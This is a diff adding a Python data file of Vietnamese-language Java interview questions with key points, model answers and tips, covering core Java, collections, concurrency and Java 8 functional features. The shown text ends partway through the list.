@@ -1,0 +1,725 @@
+import json
+
+audit_questions = [
+    # ==========================================
+    # 1. JAVA CORE & JVM (1 - 12)
+    # ==========================================
+    {
+        "id": "audit_1",
+        "domain": "Java Core",
+        "question": "Phân biệt toán tử == và phương thức .equals() trong Java? Giải thích cơ chế String Constant Pool?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "== so sánh địa chỉ ô nhớ (reference identity) đối với Object, so sánh giá trị nhị phân đối với primitive types.",
+            ".equals() mặc định trong class Object dùng ==, nhưng các lớp con (String, Integer, Date...) override để so sánh giá trị logic.",
+            "String Constant Pool là vùng nhớ đặc biệt trong Heap lưu trữ chuỗi literal nhằm tái sử dụng bộ nhớ.",
+            "String s1 = 'abc'; s2 = 'abc' -> s1 == s2 (true). Nhưng s3 = new String('abc') luôn tạo object mới trên Heap -> s1 == s3 (false)."
+        ],
+        "modelAnswer": "Trong Java:\n1. **Toán tử `==`**: Dùng để so sánh giá trị nhị phân trực tiếp. Với primitive types (int, double, boolean...), nó so sánh giá trị. Với đối tượng (Object), nó so sánh **địa chỉ ô nhớ** (hai biến có cùng trỏ tới 1 vùng nhớ trên Heap hay không).\n2. **Phương thức `.equals()`**: Mặc định trong class `Object`, nó vẫn dùng `==`. Tuy nhiên, các lớp như `String`, `Integer`, `Date` đã override lại để **so sánh bình đẳng về mặt nội dung logic**.\n3. **Cơ chế String Constant Pool**: Khi tạo chuỗi dạng literal `String s1 = \"hello\";`, JVM sẽ tìm trong Pool xem đã có chuỗi \"hello\" chưa. Nếu có rồi, nó trả về tham chiếu đến chuỗi đó mà không cấp phát thêm. Nếu viết `String s2 = new String(\"hello\");`, JVM bắt buộc tạo đối tượng mới độc lập trên Heap, dù nội dung giống nhau. Do đó `s1 == s2` là `false`, nhưng `s1.equals(s2)` là `true`. Phương thức `s2.intern()` sẽ đưa tham chiếu về chuỗi trong Pool.",
+        "seniorTip": "Hãy vẽ mô hình Stack/Heap nhanh trong đầu khi giải thích, và chủ động nhắc đến phương thức .intern() để ghi điểm chuyên sâu."
+    },
+    {
+        "id": "audit_2",
+        "domain": "Java Core",
+        "question": "Phân biệt Overloading và Overriding? Nêu 4 quy tắc bắt buộc khi Override phương thức trong quan hệ kế thừa?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Overloading (Nạp chồng): Cùng class, cùng tên, KHÁC tham số (số lượng, kiểu, thứ tự). Xảy ra tại Compile-time (Static polymorphism).",
+            "Overriding (Ghi đè): Quan hệ cha-con, cùng tên, CÙNG tham số. Xảy ra tại Runtime (Dynamic polymorphism).",
+            "4 quy tắc Override: (1) Cùng chữ ký; (2) Access modifier không được hẹp hơn; (3) Return type phải giống hoặc covariant; (4) Không throw checked exception mới/rộng hơn.",
+            "Không thể override static method (đây là Method Hiding)."
+        ],
+        "modelAnswer": "Khác biệt cốt lõi:\n- **Overloading**: Xảy ra trong cùng một class. Các method cùng tên nhưng BẮT BUỘC khác nhau về danh sách tham số (số lượng, kiểu dữ liệu hoặc thứ tự). Kiểu trả về và access modifier có thể tùy ý. Quyết định gọi method nào được giải quyết tại Compile-time.\n- **Overriding**: Xảy ra giữa class cha và con (kế thừa/interface). Class con viết lại hiện thực của method cha để tùy biến hành vi. Quyết định gọi method nào dựa trên kiểu đối tượng thực tế tại Runtime.\n\n**4 Quy Tắc Vàng Khi Override**:\n1. **Tên và tham số**: Phải giống hệt method cha (Signature identical).\n2. **Phạm vi truy cập (Access Modifier)**: Con **KHÔNG ĐƯỢC hẹp hơn** cha. (Ví dụ: cha là `protected` thì con phải là `protected` hoặc `public`, không được là `private` hay `default`).\n3. **Kiểu trả về (Return Type)**: Phải cùng kiểu hoặc là **Covariant Return Type** (tức là kiểu con của kiểu trả về ở cha, hỗ trợ từ Java 5).\n4. **Ngoại lệ (Checked Exception)**: Con **KHÔNG ĐƯỢC** ném ngoại lệ Checked mới hoặc rộng hơn cha (có thể không throw, hoặc chỉ throw ngoại lệ con/hẹp hơn).",
+        "seniorTip": "Đừng quên nhắc rằng static method không override được mà là Method Hiding, và private method không thể override vì con không nhìn thấy."
+    },
+    {
+        "id": "audit_3",
+        "domain": "Java Core",
+        "question": "HashMap hoạt động như thế nào bên dưới bộ nhớ? Tại sao bắt buộc phải override đồng thời equals() và hashCode()?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "HashMap dựa trên bảng băm (Hash Table) gồm mảng các Node/Bucket.",
+            "put(K, V): Tính hash(key) -> index trong mảng. Nếu rỗng lưu Node. Nếu va chạm (collision), lưu vào LinkedList hoặc chuyển thành Red-Black Tree (khi bucket >= 8 từ Java 8).",
+            "Hợp đồng equals & hashCode: Nếu a.equals(b) == true thì BẮT BUỘC a.hashCode() == b.hashCode().",
+            "Nếu quên hashCode: 2 object bằng nhau có thể sinh 2 hash khác nhau, rơi vào 2 bucket khác nhau -> get() sẽ trả về null dù object đã put!"
+        ],
+        "modelAnswer": "Cơ chế hoạt động của HashMap:\n1. **Cấu trúc dữ liệu**: HashMap quản lý một mảng các Bucket (`Node<K,V>[]`). Mỗi Node gồm `hash, key, value, next`.\n2. **Khi gọi `put(key, value)`**:\n   - JVM gọi `key.hashCode()` rồi qua hàm băm nội bộ tính chỉ số `index = (n - 1) & hash`.\n   - Nếu bucket tại index đó đang trống, Node mới được gắn vào.\n   - Nếu đã có phần tử (xảy ra **Hash Collision**), HashMap duyệt danh sách liên kết tại bucket đó. Nó dùng `equals()` để so sánh key: nếu trùng key thì ghi đè value mới; nếu chưa có thì thêm vào cuối (từ Java 8, nếu bucket dài >= 8 và mảng >= 64, nó tự động chuyển từ LinkedList sang **Red-Black Tree** để giữ tốc độ tìm kiếm $O(\\log N)$ thay vì $O(N)$).\n3. **Hợp đồng equals & hashCode**:\n   - Theo Java Specification: **Nếu `a.equals(b) == true` thì `a.hashCode()` PHẢI BẰNG `b.hashCode()`**.\n   - Nếu chỉ override `equals()` mà quên `hashCode()`, hai đối tượng có nội dung giống hệt nhau sẽ có hai mã hash khác nhau. Khi gọi `get()`, HashMap tính ra bucket khác và trả về `null`!",
+        "seniorTip": "Nhắc tới Load Factor mặc định (0.75) và cơ chế Resize (gấp đôi kích thước khi đạt 75% dung lượng) sẽ thể hiện bạn hiểu sâu về Performance."
+    },
+    {
+        "id": "audit_4",
+        "domain": "Java Core",
+        "question": "Abstract Class khác gì Interface? Trong thiết kế phần mềm thực tế, khi nào nên dùng Abstract Class, khi nào nên dùng Interface?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Interface: Đại diện cho hợp đồng hành vi ('CAN-DO'), hỗ trợ đa kế thừa (implements nhiều interface).",
+            "Abstract Class: Đại diện cho mối quan hệ bản chất ('IS-A'), chỉ hỗ trợ đơn kế thừa (extends 1 class).",
+            "State & Constructor: Abstract Class có constructor, có instance variable có trạng thái; Interface (trước Java 8) chỉ có hằng số public static final.",
+            "Từ Java 8, Interface có default method và static method; Java 9 có private method."
+        ],
+        "modelAnswer": "So sánh Abstract Class và Interface:\n1. **Về bản chất quan hệ**:\n   - **Abstract Class** thể hiện quan hệ kế thừa huyết thống cốt lõi: **\"IS-A\"** (Chó là Động vật). Dùng khi các lớp con có chung bản chất và cần chia sẻ mã nguồn, trạng thái (state).\n   - **Interface** thể hiện năng lực hoặc hợp đồng hành vi: **\"CAN-DO\"** (Máy bay có thể bay, Chim có thể bay). Các class hoàn toàn không liên quan nhau vẫn có thể implement chung một Interface (ví dụ `Comparable`, `Serializable`).\n2. **Về cấu trúc ngôn ngữ**:\n   - Một class chỉ có thể kế thừa **1 Abstract Class** (đơn kế thừa), nhưng có thể implement **nhiều Interface** (đa kế thừa kiểu).\n   - Abstract Class có thể có constructor, có biến instance (state) với mọi access modifier (`private`, `protected`).\n   - Interface không có constructor. Biến trong interface mặc định luôn là `public static final`. Từ Java 8, interface bổ sung `default method` và `static method`.\n3. **Khi nào dùng gì?**\n   - Dùng **Interface** khi muốn định nghĩa bộ tiêu chuẩn chung, decoupling tầng kiến trúc (Controller phụ thuộc Service Interface).\n   - Dùng **Abstract Class** khi xây dựng khung xương cơ bản (Template Method Pattern) có các hàm dùng chung đã hoàn chỉnh và các hàm con tự viết thêm.",
+        "seniorTip": "Nêu nguyên lý 'Program to an interface, not an implementation' trong thiết kế OOP để khẳng định tư duy kiến trúc."
+    },
+    {
+        "id": "audit_5",
+        "domain": "Java Core",
+        "question": "Phân biệt bộ nhớ Stack và Heap trong JVM? Cơ chế truyền tham số trong Java là Pass-by-value hay Pass-by-reference?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Stack: Lưu trữ lời gọi hàm (Stack Frame), biến cục bộ nguyên thủy và biến tham chiếu. Tự động giải phóng khi method kết thúc. Quá tải gây StackOverflowError.",
+            "Heap: Lưu trữ toàn bộ đối tượng (Object) và mảng. Được dọn dẹp bởi Garbage Collector. Quá tải gây OutOfMemoryError.",
+            "Java 100% là PASS-BY-VALUE (Truyền theo giá trị).",
+            "Khi truyền đối tượng, giá trị được copy chính là ĐỊA CHỈ THAM CHIẾU (copy of reference). Gán obj = new Object() bên trong method không làm đổi biến bên ngoài."
+        ],
+        "modelAnswer": "1. **Bộ nhớ Stack vs Heap**:\n   - **Stack Memory**: Được cấp phát cho từng luồng (Thread). Lưu các khung lời gọi hàm (Stack Frames), các biến cục bộ kiểu nguyên thủy (`int`, `boolean`...) và các **con trỏ tham chiếu** đến đối tượng. Stack có tốc độ truy xuất cực nhanh và tự động thu hồi ô nhớ ngay khi method kết thúc. Đệ quy vô tận sẽ gây lỗi **`StackOverflowError`**.\n   - **Heap Memory**: Vùng nhớ dùng chung cho toàn bộ ứng dụng. Lưu trữ toàn bộ các **Đối tượng (Objects)** được tạo bằng từ khóa `new` và mảng. Được quản lý tự động bởi Garbage Collector (GC). Cạn kiệt bộ nhớ Heap sẽ ném lỗi **`OutOfMemoryError`**.\n2. **Cơ chế truyền tham số trong Java**:\n   - **JAVA 100% LÀ PASS-BY-VALUE!** Không có Pass-by-reference.\n   - Khi truyền primitive (ví dụ `int x = 5;`), Java sao chép nguyên giá trị 5 vào method.\n   - Khi truyền Object (ví dụ `Person p`), Java sao chép **giá trị của biến tham chiếu** (tức là sao chép con trỏ địa chỉ ô nhớ). Vì cả hai con trỏ cùng trỏ vào 1 đối tượng trên Heap, nên thao tác `p.setName(\"Nam\")` sẽ làm thay đổi đối tượng thật. Tuy nhiên, nếu bên trong hàm viết `p = new Person(\"Lan\")`, thì chỉ có biến bản sao bị trỏ đi chỗ khác, biến `p` ban đầu bên ngoài hàm hoàn toàn KHÔNG THAY ĐỔI!",
+        "seniorTip": "Luôn khẳng định chắc nịch 'Java is strictly pass-by-value' - đây là câu cửa miệng kiểm tra xem ứng viên có bị nhầm lẫn với C++ hay không."
+    },
+    {
+        "id": "audit_6",
+        "domain": "Java Core",
+        "question": "Phân biệt Checked Exception và Unchecked Exception? Khối finally có luôn luôn được thực thi không?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Checked Exception: Kế thừa từ Exception (trừ RuntimeException). Compiler bắt buộc phải try-catch hoặc throws (ví dụ IOException, SQLException).",
+            "Unchecked Exception: Kế thừa từ RuntimeException. Xảy ra do lỗi logic lập trình (NullPointerException, ArrayIndexOutOfBoundsException), compiler không ép xử lý.",
+            "finally LUÔN CHẠY trừ 2 trường hợp: System.exit(0) hoặc JVM crash / mất nguồn.",
+            "Nếu try return 1, finally return 2 -> hàm trả về 2 (finally ghi đè return)."
+        ],
+        "modelAnswer": "1. **Checked vs Unchecked Exception**:\n   - **Checked Exception**: Là các lớp kế thừa từ `java.lang.Exception` (ngoại trừ nhánh `RuntimeException`). Đây là các tình huống ngoại lệ ngoài tầm kiểm soát của code (file không tồn tại, đứt kết nối DB...). Trình biên dịch (javac) **bắt buộc lập trình viên phải xử lý** bằng `try-catch` hoặc khai báo `throws` ở chữ ký method (ví dụ `IOException`, `SQLException`).\n   - **Unchecked Exception**: Là các lớp kế thừa từ `java.lang.RuntimeException` hoặc `Error`. Thường xuất phát từ lỗi logic của lập trình viên (`NullPointerException`, `ArrayIndexOutOfBoundsException`, `ArithmeticException`). Compiler không bắt buộc phải try-catch.\n2. **Khối `finally` có luôn luôn chạy không?**\n   - Về nguyên tắc chuẩn: `finally` **LUÔN LUÔN ĐƯỢC THỰC THI**, kể cả khi trong khối `try` hoặc `catch` có lệnh `return`.\n   - **Trường hợp duy nhất `finally` không chạy**: Khi chương trình chủ động gọi **`System.exit(status)`** làm JVM kết thúc ngay lập tức, hoặc khi máy chủ bị mất nguồn điện / tiến trình OS bị kill cưỡng bức.\n   - Lưu ý bẫy thi: Nếu `try` trả về `1` nhưng `finally` có câu lệnh `return 2;`, thì giá trị cuối cùng trả về sẽ là `2` vì finally sẽ ghi đè toàn bộ luồng điều khiển trước đó.",
+        "seniorTip": "Nêu thêm việc không nên viết lệnh return trong finally vì nó sẽ nuốt chửng cả exception đang văng ra (anti-pattern)."
+    },
+    {
+        "id": "audit_7",
+        "domain": "Java Core",
+        "question": "Phân biệt final, finally và finalize() trong Java?",
+        "timeLimitSeconds": 75,
+        "keyPoints": [
+            "final: Từ khóa modifier (biến không đổi giá trị, method không thể override, class không thể kế thừa).",
+            "finally: Khối lệnh đi kèm try-catch để dọn dẹp tài nguyên (close stream, connection).",
+            "finalize(): Phương thức của class Object, được GC gọi trước khi thu hồi đối tượng (đã bị deprecated từ Java 9)."
+        ],
+        "modelAnswer": "Đây là 3 khái niệm hoàn toàn khác nhau về bản chất:\n1. **`final` (Từ khóa định nghĩa tính bất biến)**:\n   - Áp dụng cho biến: Biến trở thành hằng số, chỉ được gán giá trị một lần duy nhất.\n   - Áp dụng cho phương thức: Lớp con không thể Override phương thức này.\n   - Áp dụng cho lớp (class): Lớp này không thể bị kế thừa (ví dụ `String`, `Integer` là final class).\n2. **`finally` (Khối dọn dẹp tài nguyên)**:\n   - Là một khối lệnh nằm trong cấu trúc xử lý ngoại lệ `try-catch-finally`.\n   - Luôn luôn được thực thi để đóng các tài nguyên mở như `InputStream`, `Connection`, `PreparedStatement` nhằm chống thất thoát bộ nhớ (resource leak).\n3. **`finalize()` (Phương thức dọn dẹp của Garbage Collector)**:\n   - Là phương thức của lớp `java.lang.Object`.\n   - Được trình thu gom rác (GC) gọi một lần duy nhất trước khi tiêu hủy đối tượng để giải phóng tài nguyên gốc (native resources). Phương thức này không đảm bảo thời điểm chạy và đã bị đánh dấu **Deprecated từ Java 9** (thay thế bằng `AutoCloseable` và `try-with-resources`).",
+        "seniorTip": "Đây là câu hỏi phân loại ứng viên cơ bản nhưng rất hay được hỏi ở vòng Audit khởi động để đo khả năng phân tách khái niệm."
+    },
+    {
+        "id": "audit_8",
+        "domain": "Java Core",
+        "question": "So sánh String, StringBuffer và StringBuilder? Tại sao String trong Java lại được thiết kế bất biến (Immutable)?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "String: Bất biến (Immutable), mỗi lần sửa tạo object mới. Thích hợp lưu trữ dữ liệu tĩnh (tài khoản, URL).",
+            "StringBuffer: Khả biến (Mutable), thread-safe (các phương thức đều synchronized), hiệu năng chậm hơn StringBuilder.",
+            "StringBuilder: Khả biến (Mutable), non-synchronized, tốc độ cao nhất, khuyến nghị dùng cho xử lý chuỗi đơn luồng.",
+            "Tại sao String bất biến: (1) An toàn String Pool; (2) An toàn đa luồng (Thread-safe); (3) An toàn bảo mật (Security); (4) Tối ưu Caching HashCode."
+        ],
+        "modelAnswer": "1. **So sánh 3 lớp xử lý chuỗi**:\n   - **`String`**: Bất biến (**Immutable**). Một khi đã tạo ra trên bộ nhớ thì không thể sửa đổi nội dung. Mọi thao tác nối chuỗi `s += \"a\"` thực chất là tạo ra một đối tượng String hoàn toàn mới trên Heap, gây tốn bộ nhớ nếu lặp lại nhiều lần trong vòng for.\n   - **`StringBuffer`**: Khả biến (**Mutable**). Có thể thay đổi trực tiếp trên mảng char nội bộ thông qua `append()`. Điểm đặc trưng là **Thread-safe** vì hầu hết các phương thức đều có từ khóa `synchronized`, do đó tốc độ chậm hơn.\n   - **`StringBuilder`** (Java 5): Giống hệt `StringBuffer` về mặt API nhưng **KHÔNG synchronized** (không thread-safe). Bù lại, tốc độ xử lý là nhanh nhất. Khuyến nghị sử dụng trong 95% trường hợp đơn luồng.\n2. **Lý do Java thiết kế String bất biến**:\n   - **String Constant Pool**: Nếu String có thể sửa, việc thay đổi ở một biến sẽ làm thay đổi giá trị của tất cả các biến khác đang dùng chung chuỗi đó trong Pool.\n   - **Bảo mật (Security)**: Chuỗi String thường dùng chứa username, password, địa chỉ IP mạng, kết nối DB. Nếu nó khả biến, một tiến trình khác có thể lén thay đổi nội dung sau khi đã vượt qua vòng kiểm duyệt.\n   - **Thread-safe**: Do không thể sửa đổi, đối tượng String có thể được chia sẻ tự do giữa hàng trăm luồng mà không lo xung đột dữ liệu.\n   - **Caching HashCode**: Vì nội dung không đổi nên mã `hashCode()` của String chỉ cần tính toán 1 lần duy nhất rồi cache lại, giúp các cấu trúc như `HashMap`, `HashSet` tra cứu cực kỳ nhanh.",
+        "seniorTip": "Nêu 4 lý do String bất biến là câu trả lời chuẩn chỉ của một Senior Java Architect."
+    },
+    {
+        "id": "audit_9",
+        "domain": "Java Core",
+        "question": "So sánh ArrayList và LinkedList? Độ phức tạp thuật toán Big-O khi thao tác thêm, xóa, tìm kiếm?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "ArrayList: Dựa trên mảng động (Dynamic Array). Truy cập ngẫu nhiên theo index O(1). Thêm/xóa ở giữa O(N) vì phải dịch mảng.",
+            "LinkedList: Dựa trên danh sách liên kết đôi (Doubly-linked list). Truy cập theo index O(N) vì phải duyệt từ đầu/cuối.",
+            "Thêm/xóa ở đầu/cuối: LinkedList là O(1). ArrayList thêm ở cuối là O(1) amortized, nhưng resize mảng tốn O(N).",
+            "Chi phí bộ nhớ: LinkedList tốn thêm RAM để lưu 2 con trỏ prev/next cho mỗi Node."
+        ],
+        "modelAnswer": "1. **Cấu trúc bên dưới**:\n   - **`ArrayList`**: Quản lý dữ liệu bằng một **Mảng động (Resizable Array)** liên tục trên bộ nhớ.\n   - **`LinkedList`**: Quản lý dữ liệu bằng các **Node liên kết đôi (Doubly-Linked List)** nằm rải rác trên Heap, mỗi Node chứa dữ liệu và hai con trỏ trỏ tới `prev` và `next`.\n2. **Độ phức tạp thuật toán (Big-O)**:\n   - **Tìm kiếm theo chỉ số `get(index)`**:\n     - `ArrayList` đạt **$O(1)$** vì mảng có địa chỉ tính toán trực tiếp `base_address + index * size`.\n     - `LinkedList` mất **$O(N)$** (tối ưu duyệt từ đầu hoặc cuối là $O(N/2)$) vì phải nhảy qua từng con trỏ.\n   - **Thêm/Xóa phần tử (`add`/`remove`)**:\n     - Ở đầu danh sách: `LinkedList` là **$O(1)$**, `ArrayList` là **$O(N)$** (phải dịch toàn bộ mảng sang phải).\n     - Ở giữa danh sách: Cả hai đều mất $O(N)$ (ArrayList mất $O(N)$ dịch mảng, LinkedList mất $O(N)$ để tìm vị trí rồi $O(1)$ đổi con trỏ).\n     - Ở cuối danh sách: `ArrayList` thường là **$O(1)$ amortized** (trừ lúc resize mảng đầy phải copy sang mảng mới gấp 1.5 lần), `LinkedList` là **$O(1)$**.\n3. **Khuyến nghị sử dụng**: Trong thực tế lập trình, **`ArrayList` được ưu tiên dùng trong 90% trường hợp** vì tận dụng được bộ nhớ đệm CPU Cache locality và tiết kiệm RAM hơn (LinkedList tốn thêm bộ nhớ cho 2 con trỏ ở mỗi phần tử).",
+        "seniorTip": "Nhấn mạnh yếu tố CPU Cache locality của ArrayList để ghi điểm tuyệt đối về phần cứng và cấu trúc máy tính."
+    },
+    {
+        "id": "audit_10",
+        "domain": "Java Core",
+        "question": "Phân biệt Comparable và Comparator trong Java? Khi nào sử dụng interface nào?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Comparable: Nằm trong package java.lang. Định nghĩa thứ tự tự nhiên (Natural ordering) bên trong chính class đó thông qua compareTo(T o).",
+            "Comparator: Nằm trong package java.util. Định nghĩa chiến lược sắp xếp tùy biến bên ngoài thông qua compare(T o1, T o2).",
+            "Comparable can thiệp sửa đổi mã nguồn class; Comparator không cần can thiệp class gốc.",
+            "Một class chỉ có 1 Comparable duy nhất, nhưng có thể có vô số Comparator khác nhau (sắp theo tên, theo tuổi, theo giá...)."
+        ],
+        "modelAnswer": "Khác biệt giữa `Comparable` và `Comparator`:\n1. **Vị trí và phương thức**:\n   - **`Comparable<T>`** thuộc gói `java.lang`. Có 1 phương thức duy nhất: **`int compareTo(T o)`**. Class cần so sánh phải tự implements interface này (can thiệp trực tiếp mã nguồn class).\n   - **`Comparator<T>`** thuộc gói `java.util`. Có phương thức cốt lõi: **`int compare(T o1, T o2)`**. Được viết thành một lớp riêng biệt hoặc viết dưới dạng Anonymous class / Lambda expression mà không cần chạm vào class gốc.\n2. **Mục đích sử dụng**:\n   - **`Comparable`** dùng để định nghĩa **Thứ tự tự nhiên (Natural Ordering)** của đối tượng (ví dụ sinh viên thì mặc định sắp xếp theo mã sinh viên).\n   - **`Comparator`** dùng khi ta muốn sắp xếp theo **Nhiều tiêu chí linh hoạt khác nhau** (ví dụ lúc cần xếp theo điểm số, lúc cần xếp theo tên A-Z, lúc xếp theo ngày sinh) hoặc khi class đó thuộc thư viện bên ngoài mà ta không có quyền sửa code.\n3. **Giá trị trả về**:\n   - Trả về số âm: Đối tượng 1 đứng trước đối tượng 2.\n   - Trả về `0`: Hai đối tượng tương đương nhau về thứ tự.\n   - Trả về số dương: Đối tượng 1 đứng sau đối tượng 2.",
+        "seniorTip": "Có thể viết nhanh ví dụ Lambda của Comparator trong Java 8: list.sort(Comparator.comparing(Student::getAge).reversed());"
+    },
+    {
+        "id": "audit_11",
+        "domain": "Java Core",
+        "question": "Trong Multithreading, gọi phương thức start() khác gì gọi trực tiếp run()? Từ khóa synchronized hoạt động dựa trên cơ chế nào?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "start(): Tạo ra một hệ điều hành Thread (OS Thread) mới, cấp phát call stack riêng, rồi JVM mới gọi hàm run() trên luồng mới đó.",
+            "run(): Chỉ là một phương thức bình thường, gọi trực tiếp sẽ chạy tuần tự trên luồng hiện tại (main thread), không có đa luồng!",
+            "synchronized hoạt động dựa trên cơ chế Khóa đối tượng (Monitor Lock / Intrinsic Lock).",
+            "Mỗi object trong Java có 1 monitor lock. Luồng nào chiếm được lock mới được vào khối lệnh synchronized, các luồng khác rơi vào trạng thái BLOCKED."
+        ],
+        "modelAnswer": "1. **`start()` vs `run()`**:\n   - Khi gọi **`thread.start()`**: JVM sẽ yêu cầu Hệ điều hành khởi tạo một **Thread mới thực sự**, cấp phát một vùng nhớ Stack riêng biệt cho luồng đó. Sau đó, hệ thống sẽ tự động gọi phương thức `run()` trên luồng mới này một cách bất đồng bộ (concurrently).\n   - Khi gọi trực tiếp **`thread.run()`**: Nó chỉ đơn thuần là một lời gọi phương thức thông thường trên **chính luồng hiện tại (Main Thread)**. Không có luồng mới nào được sinh ra, chương trình vẫn chạy tuần tự đồng bộ từng dòng.\n2. **Cơ chế hoạt động của `synchronized`**:\n   - Từ khóa `synchronized` trong Java hoạt động dựa trên cơ chế **Monitor Lock (hay Intrinsic Lock)**.\n   - Trong Java, mọi Đối tượng (`Object`) đều sở hữu một ổ khóa nội tại gắn liền với nó.\n   - Khi một luồng bước vào phương thức hoặc khối lệnh `synchronized(this)`, nó phải **chiếm giữ (acquire) Monitor Lock** của đối tượng đó. Trong khi luồng này đang giữ khóa, bất kỳ luồng nào khác cố gắng truy cập vào các khối lệnh dùng chung ổ khóa đó sẽ bị hệ thống chặn lại và chuyển sang trạng thái **`BLOCKED`**.\n   - Khi luồng hoàn tất hoặc ném exception, Monitor Lock được tự động giải phóng (release) cho luồng tiếp theo vào tranh chấp.",
+        "seniorTip": "Nếu synchronized đặt ở static method, ổ khóa sẽ là Class Object (MyClass.class) chứ không phải instance."
+    },
+    {
+        "id": "audit_12",
+        "domain": "Java Core",
+        "question": "Deadlock (Bế tắc) trong đa luồng là gì? Nêu 4 điều kiện sinh ra Deadlock và phương pháp giải quyết?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Deadlock xảy ra khi 2 hoặc nhiều luồng cùng chờ đợi tài nguyên mà luồng kia đang nắm giữ, không ai chịu nhường -> đóng băng vĩnh viễn.",
+            "Ví dụ kinh điển: Thread 1 giữ Lock A chờ Lock B; Thread 2 giữ Lock B chờ Lock A.",
+            "4 điều kiện Coffman: Mutual Exclusion, Hold and Wait, No Preemption, Circular Wait.",
+            "Giải pháp: Phá vỡ Circular Wait bằng cách luôn chiếm các Lock theo một THỨ TỰ CỐ ĐỊNH (Lock Ordering) hoặc dùng ReentrantLock.tryLock()."
+        ],
+        "modelAnswer": "1. **Khái niệm Deadlock**:\n   - Deadlock là hiện tượng bế tắc trong đó hai hoặc nhiều tiến trình/luồng bị treo vĩnh viễn do **luồng này đang giữ tài nguyên mà luồng kia cần, đồng thời đang chờ tài nguyên mà luồng kia đang nắm giữ**.\n   - Ví dụ: Luồng 1 giữ ổ khóa A, muốn lấy ổ khóa B. Cùng lúc đó Luồng 2 đang giữ ổ khóa B và muốn lấy ổ khóa A. Cả hai luồng chờ nhau mãi mãi.\n2. **4 Điều kiện sinh ra Deadlock (Coffman Conditions)**:\n   - *Mutual Exclusion*: Tài nguyên chỉ cho phép 1 luồng truy cập tại 1 thời điểm.\n   - *Hold and Wait*: Luồng đang giữ ít nhất 1 tài nguyên và đang chờ tài nguyên khác.\n   - *No Preemption*: Không thể cưỡng bức giật tài nguyên khỏi tay luồng đang giữ.\n   - *Circular Wait*: Tồn tại một chuỗi vòng tròn các luồng chờ đợi lẫn nhau ($T_1 \\to T_2 \\to T_3 \\to T_1$).\n3. **Giải pháp phòng chống Deadlock**:\n   - **Chiến lược sắp xếp thứ tự khóa (Lock Ordering)**: Luôn đảm bảo tất cả các luồng phải chiếm khóa theo cùng một thứ tự duy nhất (ví dụ luôn chiếm A trước rồi mới chiếm B). Điều này phá vỡ hoàn toàn điều kiện *Circular Wait*.\n   - **Sử dụng `tryLock(timeout)`** của `ReentrantLock`: Nếu sau một khoảng thời gian không lấy được khóa thì chủ động nhả khóa đang cầm và thử lại sau (tránh chờ đợi vô tận).",
+        "seniorTip": "Nêu bài toán 'Dining Philosophers' (Triết gia ăn tối) như ví dụ minh họa trực quan."
+    },
+
+    # ==========================================
+    # 2. JAVA 8+ MODERN (13 - 20)
+    # ==========================================
+    {
+        "id": "audit_13",
+        "domain": "Java 8+ Modern",
+        "question": "Functional Interface là gì? Phân biệt 4 Functional Interface cốt lõi: Predicate, Function, Consumer, Supplier?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Functional Interface: Interface chỉ có DUY NHẤT 1 abstract method (có thể có nhiều default/static methods). Đánh dấu bằng @FunctionalInterface.",
+            "Predicate<T>: Nhận 1 tham số T, trả về boolean (hàm test).",
+            "Function<T, R>: Nhận T, trả về kết quả R (hàm biến đổi/mapping).",
+            "Consumer<T>: Nhận T, không trả về gì (void - hàm tiêu thụ/in ấn).",
+            "Supplier<T>: Không nhận tham số, cung cấp ra một đối tượng T (hàm sinh/cung cấp)."
+        ],
+        "modelAnswer": "1. **Định nghĩa Functional Interface**:\n   - Là interface chỉ chứa **duy nhất một phương thức trừu tượng (Single Abstract Method - SAM)**. Nó có thể chứa thêm các phương thức `default` hoặc `static`.\n   - Được chú thích bằng `@FunctionalInterface` để compiler kiểm tra tính hợp lệ. Đây là nền tảng cốt lõi cho biểu thức Lambda trong Java 8.\n2. **4 Functional Interface cơ bản trong gói `java.util.function`**:\n   - **`Predicate<T>`**: Phương thức `boolean test(T t)`. Dùng để kiểm tra điều kiện (lọc). Ví dụ: `p -> p.getAge() > 18`.\n   - **`Function<T, R>`**: Phương thức `R apply(T t)`. Nhận vào một đối tượng kiểu T và biến đổi trả về đối tượng kiểu R. Ví dụ: `user -> user.getName()`.\n   - **`Consumer<T>`**: Phương thức `void accept(T t)`. Nhận vào tham số và thực hiện hành động (in ra màn hình, lưu DB), không có giá trị trả về. Ví dụ: `item -> System.out.println(item)`.\n   - **`Supplier<T>`**: Phương thức `T get()`. Không nhận tham số đầu vào nào, nhưng tự sinh ra hoặc cung cấp một đối tượng kiểu T (ví dụ cung cấp giá trị mặc định, tạo kết nối).",
+        "seniorTip": "Liên hệ ngay với Stream API: filter dùng Predicate, map dùng Function, forEach dùng Consumer."
+    },
+    {
+        "id": "audit_14",
+        "domain": "Java 8+ Modern",
+        "question": "Stream API trong Java 8 là gì? Phân biệt Intermediate Operations và Terminal Operations? Nêu tính chất Lazy Evaluation?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Stream API dùng để xử lý tập hợp dữ liệu theo phong cách Declarative (hàm chức năng) thay vì vòng lặp for truyền thống.",
+            "Intermediate Operations: Trả về một Stream mới (filter, map, sorted, distinct). Có tính chất LAZY (chưa thực thi ngay).",
+            "Terminal Operations: Thực thi luồng xử lý và đóng Stream, trả về kết quả cụ thể hoặc void (collect, forEach, count, reduce).",
+            "Lazy Evaluation: Các bước trung gian chỉ được kích hoạt khi có một Terminal Operation được gọi."
+        ],
